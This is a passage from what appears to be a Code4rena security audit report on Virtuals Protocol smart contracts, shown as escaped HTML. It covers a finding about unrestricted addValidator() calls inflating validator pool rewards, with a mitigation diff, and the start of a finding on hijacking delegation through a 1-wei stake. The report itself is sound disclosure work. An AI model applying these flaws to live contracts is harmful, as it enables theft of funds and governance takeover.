class=\"grvsc-source\"\u003e        return virtualId;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // AgentNftV2::addValidator()\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Expected to be called by `AgentVeToken::stake()` function\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function addValidator(uint256 virtualId, address validator) public {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        if (isValidator(virtualId, validator)) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            return;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        _addValidator(virtualId, validator);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        _initValidatorScore(virtualId, validator);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // ValidatorRegistry::_addValidator()\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function _addValidator(uint256 virtualId, address validator) internal {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        _validatorsMap[virtualId][validator] = true;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e@\u0026gt;        _validators[virtualId].push(validator);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        emit NewValidator(virtualId, validator);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"1\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// AgentFactoryV2::executeApplication() \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexecuteApplication\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eid\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecanStake\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003enoReentrant\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// This will bootstrap an Agent with following components:\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// C1: Agent Token\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// C2: LP Pool + Initial liquidity\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// C3: Agent veToken\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// C4: Agent DAO\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// C5: Agent NFT\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// C6: TBA\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// C7: Stake liquidity token to get veToken\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// SNIP...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// C5\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e@\u0026gt;        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003enextVirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e@\u0026gt;        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_vault\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eapplication\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenURI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edao\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eapplication\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eapplication\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecores\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eapplication\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// SNIP...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe reward mechanism in \u003ccode\u003eAgentRewardV2\u003c/code\u003e relies on iterating over validator lists to compute and distribute rewards. If a validator is duplicated due to the aforementioned issue, the reward distribution logic - particularly in \u003ccode\u003e_distributeValidatorRewards()\u003c/code\u003e — recalculates and overwrites the validator’s rewards.\u003c/p\u003e\n\u003cp\u003eThis does not break reward allocation for individual validators due to overwriting. However, the shared variable \u003ccode\u003evalidatorPoolRewards\u003c/code\u003e accumulates validator-level residuals multiple times due to the duplicated validator entries. As a result, \u003ccode\u003evalidatorPoolRewards\u003c/code\u003e can become overstated relative to the actual token amount deposited.\u003c/p\u003e\n\u003cp\u003eWhen \u003ccode\u003ewithdrawValidatorPoolRewards()\u003c/code\u003e is eventually called, it transfers this erroneously accumulated excess amount to the designated address. This reduces the contract’s balance below what is required to cover valid validator rewards, ultimately resulting in reward claim failures unless someone manually tops up the shortfall.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"2\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // AgentRewardV2::distributeRewards()\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function distributeRewards(uint256 amount) public onlyGov returns (uint32) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        require(amount \u0026gt; 0, \u0026quot;Invalid amount\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e@\u0026gt;        IERC20(rewardToken).safeTransferFrom(_msgSender(), address(this), amount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        RewardSettingsCheckpoints.RewardSettings memory settings = getRewardSettings();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 protocolShares = _distributeProtocolRewards(amount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 agentShares = amount - protocolShares;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        _prepareAgentsRewards(agentShares, settings);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        return SafeCast.toUint32(_mainRewards.length - 1);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // AgentRewardV2::_distributeValidatorRewards()\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function _distributeValidatorRewards(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 amount,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 virtualId,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint48 rewardId,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 totalStaked\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    ) private {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        IAgentNft nft = IAgentNft(agentNft);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // Calculate weighted validator shares\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 validatorCount = nft.validatorCount(virtualId);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 totalProposals = nft.totalProposals(virtualId);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        for (uint256 i = 0; i \u0026lt; validatorCount; i++) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            address validator = nft.validatorAt(virtualId, i);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            // Get validator revenue by votes weightage\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            address stakingAddress = getVirtualTokenAddress(nft, virtualId);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            uint256 votes = IERC5805(stakingAddress).getVotes(validator);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            uint256 validatorRewards = (amount * votes) / totalStaked;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            // Calc validator reward based on participation rate\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            uint256 participationReward = totalProposals == 0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e                ? 0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e                : (validatorRewards * nft.validatorScore(virtualId, validator)) / totalProposals;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e@\u0026gt;            _validatorRewards[validator][rewardId] = participationReward;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e@\u0026gt;            validatorPoolRewards += validatorRewards - participationReward;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // AgentRewardV2::withdrawValidatorPoolRewards()\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function withdrawValidatorPoolRewards(address recipient) external onlyGov {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        require(validatorPoolRewards \u0026gt; 0, \u0026quot;No validator pool rewards\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        IERC20(rewardToken).safeTransfer(recipient, validatorPoolRewards);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        validatorPoolRewards = 0;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"recommended-mitigation-steps\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eAdd access control to \u003ccode\u003eaddValidator()\u003c/code\u003e:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"3\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk8\"\u003e- function addValidator(uint256 virtualId, address validator) public {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+ function addValidator(uint256 virtualId, address validator) public onlyRole(VALIDATOR_ADMIN_ROLE) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    if (isValidator(virtualId, validator)) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        return;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    _addValidator(virtualId, validator);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    _initValidatorScore(virtualId, validator);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eVirtuals marked as informative\u003c/strong\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"h-02-anybody-can-control-a-users-delegate-by-calling-agentvetokenstake-with-1-wei\" style=\"position:relative;\"\u003e\u003ca href=\"#h-02-anybody-can-control-a-users-delegate-by-calling-agentvetokenstake-with-1-wei\" aria-label=\"h 02 anybody can control a users delegate by calling agentvetokenstake with 1 wei permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-5\"\u003e[H-02] Anybody can control a user’s delegate by calling \u003ccode\u003eAgentVeToken.stake()\u003c/code\u003e with 1 wei\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-94\"\u003eBowTiedOriole\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-299\"\u003e0x1982us\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-406\"\u003eBlackAdam\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-755\"\u003echupinexx\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-141\"\u003eEgbe\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-151\"\u003eIshenxx\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-701\"\u003enatachi\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-698\"\u003ePelz\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/virtualPersona/AgentVeToken.sol#L80\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/virtualPersona/AgentVeToken.sol#L80\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eAgentVeToken.stake()\u003c/code\u003e function will automatically update the delegatee for the receiver. A malicious user can stake 1 wei of the LP token, set the receiver to be a user with an high balance of the veTokens, and set themselves as the delegatee. \u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"4\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003estake\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edelegatee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan 